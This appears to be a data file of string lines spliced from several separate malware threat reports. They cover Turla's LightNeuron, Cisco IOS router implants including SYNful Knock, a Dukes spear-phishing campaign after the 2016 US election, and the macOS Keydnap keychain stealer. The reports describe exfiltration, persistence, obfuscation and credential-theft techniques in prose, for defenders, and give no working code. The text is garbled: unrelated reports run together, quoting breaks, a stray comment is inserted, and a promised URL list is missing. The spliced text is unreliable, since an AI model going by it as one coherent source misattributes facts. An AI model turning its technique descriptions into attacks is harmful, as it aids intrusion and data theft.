      "LightNeuron is a very powerful piece of malware. It can spy on all the emails of the compromised organization\n",
      "but also execute commands, for example, to control other machines on the local network. This makes\n",
      "it a main hub in the breached network for Turla operators.\n",
      "We will continue to monitor Turla developments to help defenders to protect their networks.\n",

      "Evolution of attacks on Cisco IOS devices\n",
      "Graham Holmes\n",
      "While “SYNful Knock” is the latest identified malware targeting Cisco devices running Cisco IOS, we have identified and investigated six other malware incidents during the last four years that target Cisco devices running Cisco IOS. The nature of threats is evolving and Cisco will continue to adapt technology delivering trustworthy solutions that our customers can rely on. This also means that customers will need to evolve, fully utilizing the security tools that are available, as well as ensuring security best practices are in place.\n",
      "The malware used in these evolved Cisco IOS attacks show increasing levels of complexity in the type of modifications made to Cisco IOS, the behavior of its Command and Control (C&C) network (when present), and the platforms they target.\n",
      "Before talking about specifics of each investigated malware incident, it is important to note that in all cases, no evidence has been found that attackers exploited a previously known or unknown vulnerability to install the malware. All available data points suggest either the use of compromised administrator credentials or physical access to the devices or images.\n",
      "The following table and associated description provides a brief overview of the malware samples, as well as an overview of the actions that Cisco took in response to those findings. The source of this information is internal analysis performed by Cisco forensics teams.\n",
      "Notes to table:\n",
      "INFECTION METHOD: Static means “modifications to the IOS binary stored in the device’s flash”, Runtime means “modifications performed to the runtime memory code without changes to the IOS binary in flash”\n",
      "REMOTE DETECTABILITY: refers to the means to remotely look for the presence of the malware on a compromised system through scanning systems and signatures. Other means of detecting modifications through memory analysis is possible in all cases.\n",
      "Incidents 0 and 1\n",
      "The first two incidents were detected in 2011 and 2012 respectively, and were most likely custom malware targeting a specific victim. Those incidents were very basic (from a technical point of view) and involve binary patches to a Cisco IOS image. They allowed the modified IOS image file to be installed on the target routers (C3825, C2800nm, and C3845). Devices affected were in the Cisco 2800 and 3800 family of routers. No other Cisco devices were identified as affected by this malware.\n",
      "The modification essentially affects the Diffie-Hellman key exchange protocol in order to weaken the derived keying material. The result is that with casual inspection the encrypted traffic seems unmodified, but the effect is that an attacker could decrypt protected traffic with less effort than would normally be required.\n",
      "Platforms implementing Trust Anchor technologies and signed binaries would not be affected by either one of those two malware examples.\n",
      "Incidents 2 and 3\n",
      "Two new malware samples were identified in 2013, both targeting the Cisco 7600 series of devices. In both cases, the attacker leveraged compromised administrator credentials to modify the in-memory copy of the Cisco IOS code, using debugging and troubleshooting Cisco IOS command line interface (CLI) commands.\n",
      "The primary purpose of the added code appears to be exfiltration of IPv4 packets that match criteria set by the attacker. The targeted traffic is copied and those packets are then forwarded to a specified IP address that is under the control of the attacker. A secondary purpose is to provide NAT (Network Address Translation) capabilities, so an attacker is able to access an IPv4 address within a compromised network that would normally not be reachable from the public Internet (ie: devices using RFC-1918 addresses).\n",
      "Since both of these malware samples involved the modification of the in-memory code for Cisco IOS, neither Trust Anchor technologies nor image validation features would have detected or prevented the attack. But, because the modifications were performed on the in-memory copy of Cisco IOS, neither attack would achieve persistency across device reloads.\n",
      "Incident 3 has only been detected in a single customer network. It was discovered while troubleshooting crashes on line cards on installed Cisco 7600 devices. Forensic analysis of the associated core dumps found that this attack used a C&C mechanism similar to Incident 2 to provide the malware with instructions for data exfiltration. What is unique in this incident is targeting of multi-architecture line cards – something we have not seen in any other malware analyzed as of this writing.\n",
      "In both cases, the modifications were made to the in-memory copy of the executable code for the Cisco IOS image (with no changes to the actual binary Cisco IOS image in flash). The use of signed Cisco IOS images would not be a defense. It does, however, highlight the need for strong protection of administrative credentials and authorization mechanisms for privileged access to any network device.\n",
      "Incident 4\n",
      "Incident 4 was discovered in late 2014 and affected Cisco 1800, Cisco 3800 and Cisco 7200 devices. Like the malware seen in Incidents 2 and 3, the attack leveraged compromised administrative credentials to gain access to target devices for the purpose of installing the malware.\n",
      "This malware, however, showed an increase in complexity compared to previous malware analyzed. It is the only analyzed malware so far that is capable of persistence through both device reload as well as through Cisco IOS software upgrades.\n",
      "The malware has two separate components:\n",
      "An initial infection, where the ROMMON on the targeted Cisco device is modified to ensure persistence of the C&C channel;\n",
      "A secondary infection occurs when the ROMMON is used to inject binary code into the in-memory Cisco IOS image to support data exfiltration.\n",
      "Note: This malware does not modify the binary Cisco IOS image in flash.\n",
      "The ROMMON component of the malware handles the C&C messages, which are embedded within the payload of ICMP packets delivered through the IPv4 protocol.\n",
      "The secondary infection component is highly modular, and supports the loading and unloading of optional “modules,” which are delivered to the device through the C&C channel. One of the observed modules purpose is to exfiltrate device-specific data via ICMP packets. This module creates an ICMP Echo Request packet with the data to be exfiltrated as its payload. Other modules provide NAT capabilities, so C&C messages can reach devices that would otherwise not be accessible from the public Internet, and additional exfiltration capabilities for other traffic defined by the attacker.\n",
      "Like Incident 3, the use of signed IOS images would not prevent this attack, as the binary Cisco IOS image stored in flash is never modified. However, the ROMMON compromise (used to achieve persistence between reloads and Cisco IOS software upgrades) would not be successful with current devices that incorporate secure boot, trust anchor modules, and image signing capabilities.\n",
      "Incident 5 (SYNful Knock)\n",
      "The last example (known as SYNful Knock and jointly disclosed by Cisco and Mandiant’s FireEye), uses the same static modifications to the Cisco IOS binary seen in Incidents 0 and 1. It also uses a C&C approach similar to the one observed in Incident 2, but uses TCP instead of ICMP for C&C traffic (hence the name SYNful Knock).\n",
      "SYNful Knock (like malware #0, #1, #2 and #3) CANNOT survive the installation of a known good Cisco IOS binary image, obtained from a known, trusted source and verified to have the correct hash values.\n",
      "Cisco actions to prevent and detect attacks against Cisco devices\n",
      "Since 2008, the Cisco Secure Development Lifecycle framework has provided development teams with standards and requirements to ensure products are designed with protection features and capabilities. Boot time and run time security features, such as Trust Anchor modules, secure boot, and memory protection are standard requirements. The goal of these features is to protect customers from remote code injection attacks or static modifications to Cisco IOS binary images.\n",
      "As soon as the first malware was detected “in the wild,” forensics and analysis teams at Cisco began accelerating the development of detection capabilities. We’ve developed forensics tools that can quickly validate the authenticity of IOS images from core dumps or in-memory images. These are key tools used in incident response to help our customers confirm whether there is a compromise and the extent of such a compromise.\n",
      "Concurrently with the development of such forensics tools, we implemented measures to further ensure our supply chain integrity: verifying Cisco IOS image integrity through development, compilation, testing and release, and all the way to distribution points. As part of those efforts, we recently introduced and began posting SHA-512 hash values for any Cisco image to further increase customer confidence on their image authenticity. These are available for customer download on www.cisco.com.\n",
      "We have also posted instructions and guidance for customers to harden their router authentication, authorization and accounting process and for validating Cisco IOS binary images already installed or to be installed on their Cisco devices.\n",
      "We’ve deployed tools that automatically analyze core dumps provided by customers to the Cisco Technical Assistance Center (TAC) as part of a Service Request. These tools automatically detect modifications to Cisco IOS images. They also detect malicious and/or counterfeit images by analyzing binary images installed on any Cisco device that come through our RMA process.\n",
      "We have reviewed all Cisco IOS command line interface (CLI) commands, and have removed commands that provide limited value to customers during normal device operation, but could be misused by attackers with access to the device CLI.\n",
      "We are in the pilot phase of an image validation service that offers customers the ability to quickly and automatically analyze and detect modified Cisco IOS images running on their Cisco devices.\n",
      "We have released SNORT and Yara signatures that detect SYNful Knock malware.\n",
      "We have worked with all customers to quickly address their concerns or help them validate the running images in their network have not been compromised.\n",
      "What Can You Do?\n",
      "We have published several documents that can be used by Cisco customers wanting to better understand how to protect their Cisco IOS devices, harden their device configurations (including credential management procedures), and verify binary or in-memory running Cisco IOS images. The following are some of the resources you can find on www.cisco.com:\n",
      "Cisco IOS Software Integrity Assurance\n",
      "Cisco Guide to Harden IOS Devices\n",
      "Telemetry-Based Infrastructure Device Integrity Monitoring\n",
      "Trust Anchor Technologies on Cisco products\n",
      "While some of the previously listed measures have been reactive, we are also taking active steps in developing new capabilities to meet the challenges of an ever changing threat landscape. In terms of the attack continuum – protect, detect, recover – Cisco has focused for many years on addressing the challenges of protecting our products through hardening, resiliency, and security capabilities.\n",
      "We will continue and even accelerate those efforts, while also rapidly developing and adding detection and recovery capabilities to our products in the medium and long term.\n",
      "The challenge is clear: the nature of the threat to our customers is ever evolving. Cisco will continue to focus on providing trustworthy solutions that our customers can rely on in this changing landscape.\n",

All available data points suggest either the use of compromised administrator credentials or physical access to the devices or images.” – This is human error.\n",
      "How well we can protect our organizations is only as secure as the weakest link in our human user base.

      "In the wake of the 2016 United States Presidential Election, not even six hours after Donald Trump became the nation's President-Elect, an advanced persistent threat (APT) group launched a series of coordinated and well-planned spear phishing campaigns. Volexity observed five different attack waves with a heavy focus on U.S.-based think tanks and non-governmental organizations (NGOs). These e-mails came from a mix of attacker created Google Gmail accounts and what appears to be compromised e-mail accounts at Harvard's Faculty of Arts and Sciences (FAS). These e-mails were sent in large quantities to different individuals across many organizations and individuals focusing in national security, defense, international affairs, public policy, and European and Asian studies. Two of the attacks purported to be messages forwarded on from the Clinton Foundation giving\n",
      "insight and perhaps a postmortem analysis into the elections. Two of the other attacks purported to be eFax links or documents pertaining to the election's outcome being revised or rigged. The last attack claimed to be a link to a PDF download on \"Why American Elections Are Flawed.\" Volexity believes a group it refers to as The Dukes (also known as APT29 or Cozy Bear) is responsible for post-election attack activity.\n",
      "Background\n",
      "Since August of this year, Volexity has been actively involved in investigating and tracking several attack campaigns from the Dukes. Most notably the Dukes have previously been tied to the breach of the Democratic National Committee (DNC) and intrusions into multiple high-profile United States Government organizations. In July 2015, the Dukes started heavily targeting\n",
      "think tanks and NGOs. This represented a fairly significant shift in the group's previous operations and one that continued in the lead up to and immediately after the 2016 United States Presidential election.\n",
      "On August 10, 2016 and August 25, 2016, the Dukes launched several waves of highly targeted spear phishing attacks against several U.S.-based think tanks and NGOs. These spear phishing messages were spoofed and made to appear to have been sent from real individuals at well-known think tanks in the United States and Europe. These August waves of attacks purported to be from individuals at Transparency International, the Center for a New American Security (CNAS),\n",
      "the International Institute for Strategic Studies (IISS), Eurasia Group, and the Council on Foreign Relations (CFR).\n",
      "The Dukes are known for launching their attacks by sending links to ZIP files, that contain malicious executables, hosted on legitimate compromised web servers. However, each of the e-mail messages from the August attacks contained a Microsoft Office Word (.doc) or Excel (.xls) attachment. These attachments, when viewed, contained legitimate report content from each of the organizations they appeared to have been sent from. However, the attackers inserted macros into the documents designed to install a malware downloader on the system. Successful exploitation would result in the download of a PNG image file from a compromised webserver. These attack campaigns leveraged steganography in the PNG files by hiding components of a backdoor that would exist only in memory after being loaded into rundll32.exe. Volexity has dubbed this backdoor PowerDuke. Similar attack campaigns using documents with macros dropping PowerDuke were further observed through October, where Universities, and not think tanks appear to have been the primary targets. Details of these attacks have been provided to Volexity customers. Concerned NGO's and Universities that may have been targeted by these attacks campaigns are welcome to reach out for additional details.\n",
      "November 9 - Post-Election Spear Phishing Waves\n",
      "The post-election attacks launched by the Dukes on November 9 were very similar to previous attacks seen from the Dukes in both 2015 and 2016. The PowerDuke malware, first seen in August 2016, was once again used in these most recent attacks. Three of the five attack waves contained links to download files from domains that the attackers appear to have control over. The other two attacks contained documents with malicious macros embedded within them. Each of these different attack waves were slightly different from one another and are detailed below.\n",
      "Attack Wave 1: eFax - The \"Shocking\" Truth About Election Rigging\n",
      "The first attack wave is similar to much older attacks from the Dukes that purport to be an electronic Fax. This message claims to have been sent from Secure Fax Corp. and has a link to a ZIP file that contains a Microsoft shortcut file (.LNK). This shortcut file contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. The e-mail message was sent from the attacker controlled e-mail account [email protected]. The screen shot below shows the e-mail that was sent.\n",
      "The e-mail contained links pointing to the following URL:\n",

      "Conclusion\n",
      "The Dukes continue to launch well-crafted and clever attack campaigns. They have had tremendous success evading anti-virus and anti-malware solutions at both the desktop and mail gateway levels. The group's anti-VM macros and PowerShell scripts appear to have drastically reduced the number of sandboxes and bots that the group has to deal with on their command and control infrastructure. This combined with their use of steganography to hide their backdoor within PNG files that are downloaded remotely and loaded in memory only or via alternate data streams (ADS) is quite novel in its approach. Volexity believes that the Dukes are likely working to gain long-term access into think tanks and NGOs and will continue to launch new attacks for the foreseeable future.\n",

      "For the last few weeks, ESET has been investigating OSX/Keydnap, a malware that steals the content of the keychain while maintaining a permanent backdoor.\n",
      "ESET analyzes multiple samples targeting OS X every day. Those samples are usually potentially unwanted applications that inject advertisements into browser displays while the victim is browsing the web.\n",
      "For the last few weeks, we have been investigating an interesting case where the purpose of the malware is to steal the content of the keychain and maintain a permanent backdoor. This article will describe the components of this threat and what we know about it so far.\n",
      "Infection vector\n",
      "It is still not clear how victims are initially exposed to OSX/Keydnap. It could be through attachments in spam messages, downloads from untrusted websites or something else.\n",
      "What we know is that a downloader component is distributed in a .zip file. The archive file contains a Mach-O executable file with an extension that looks benign, such as .txt or .jpg. However, the file extension actually contains a space character at the end, which means double-clicking the file in Finder will launch it in Terminal and not Preview or TextEdit.\n",
      "Figure 1: Finder window with the ZIP and the malicious “.jpg ” file\n",
      "Figure 2: The downloader’s file information window\n",
      "The ZIP also contains the Resource fork that contains the icon of the executable file.

      "The downloader is an unsigned Mach-O executable. Thus, if the file is downloaded from an internet browser and Gatekeeper is activated on the machine – the default in recent versions of OS X and macOS – it will not execute and display a warning to the user.\n",

      "Download and execute the backdoor component\n",

      "Open a decoy document (described later)\n",
      "Close the Terminal window that just opened\n",
      "The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now. The downloader isn’t persistent. However, the downloaded backdoor will add an entry to the LaunchAgents directory and survive across reboot. It is described in more details in the backdoor section.\n",
      "We have found multiple variants of the downloader executable. A list of different samples can be found at the end of the article.\n",
      "Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers. This suggests that Keydnap may be targeting users of underground forums or maybe even security researchers. Also included in recent variants is a “build name”. We have seen three different names: elitef*ck, ccshop and transmission.\n",

      "Obfuscation\n",
      "While the downloader module is not packed, the backdoor is packed with a modified version of UPX. Two modifications are made to UPX version 3.91:\n",
      "The magic bytes UPX! in the UPX header are replaced with ASS7,\n",
      "The decompressed code and strings sections are XORed with 0x01. While self-decompressing, the XOR is applied after decompression and before calling the main function of the original binary.\n",
      "Figure 6: Difference between a stock UPX packed file and the modified one\n",
      "A patch for UPX is available on ESET’s malware-research Github repository that allows unpacking Keydnap’s backdoor with the usual upx -d.\n",
      "Persistence\n",
      "Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots. The Library/Application Support/com.apple.iCloud.sync.daemon directory is used to keep the icloudsyncd executable. This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id. With administrator privileges, it will also change the owner of icloudsyncd to root:admin and make the executable setuid and setgid, which means it will always run as root in the future.\n",
      "Figure 7: Property list file in LaunchAgents directory\n",
      "To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle. Here is an example of the result of ps ax on an infected system:\n",

      "Keychain stealing\n",
      "The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain. The author simply took a proof-of-concept example available on Github called Keychaindump. It reads securityd’s memory and searches for the decryption key for the user’s keychain. This process is described in a paper by K. Lee and H. Koo. One of the reasons we think the source was taken directly from Github is that the function names in the source code are the same in the Keydnap malware.\n",
